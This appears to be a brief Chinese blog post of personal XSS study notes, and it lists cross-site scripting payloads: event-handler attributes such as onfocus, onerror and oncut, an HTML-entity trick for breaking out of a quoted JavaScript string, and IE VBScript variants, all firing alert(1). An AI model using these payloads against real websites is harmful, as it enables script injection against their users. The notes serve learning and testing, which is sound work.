---
layout: post
author: kele
date: 2017-8-12
title: "xss学习笔记"
catalog: true
tags:
  - 学习使我快乐
  - 总结
---
# xss学习笔记
## 挖掘
### 触点
#### orign
1.inline-javascript
2.attribute    
普通属性：`oncut(用户剪切元素时触发ctrl+x触发)=alert(1) autofocus/onfocus(点一下）=alert(1)// nerror=alert(1)//  onclick=alert(1)//   `     
事件属性：使用html实体编码闭合js ` delfeedbak('&apos;)alert(1)//') ` &apos是个'     
`vbscript(ie) <![if<iframe/onload=vbs:alert[:]>   `   
`<img language=vbs src=<bonerror=alert#1/1#>    `   
`<script language=vbs></script><img src=xx:xonerror="::alert+'1'::"`    
